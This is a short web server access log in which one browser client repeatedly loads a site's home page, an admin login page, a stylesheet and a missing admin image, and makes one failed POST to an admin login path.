98.248.133.252 - - [05/Apr/2022:22:59:58 +0000] "GET /admin-login HTTP/1.1" 200 1507 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:59:58 +0000] "GET /static/styles/student.css HTTP/1.1" 200 954 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:22:59:58 +0000] "GET /photos/admin.jpeg HTTP/1.1" 404 428 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:23:00:09 +0000] "POST /admin_login HTTP/1.1" 404 428 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:23:00:36 +0000] "GET / HTTP/1.1" 200 2121 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:23:00:37 +0000] "GET /admin-login HTTP/1.1" 200 1507 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:23:00:37 +0000] "GET /photos/admin.jpeg HTTP/1.1" 404 428 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:23:00:37 +0000] "GET /static/styles/student.css HTTP/1.1" 200 954 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:23:00:53 +0000] "GET / HTTP/1.1" 200 2121 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:23:00:55 +0000] "GET /admin-login HTTP/1.1" 200 1507 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:23:00:55 +0000] "GET /static/styles/student.css HTTP/1.1" 200 954 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:23:00:55 +0000] "GET /photos/admin.jpeg HTTP/1.1" 404 428 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:23:01:03 +0000] "GET / HTTP/1.1" 200 2121 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:23:01:07 +0000] "GET /admin-login HTTP/1.1" 200 1507 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:23:01:07 +0000] "GET /static/styles/student.css HTTP/1.1" 200 954 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:23:01:07 +0000] "GET /photos/admin.jpeg HTTP/1.1" 404 428 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:23:05:23 +0000] "GET / HTTP/1.1" 200 2121 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
98.248.133.252 - - [05/Apr/2022:23:05:25 +0000] "GET /admin-login HTTP/1.1" 200 1507 "http://34.102.11.81/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.52"
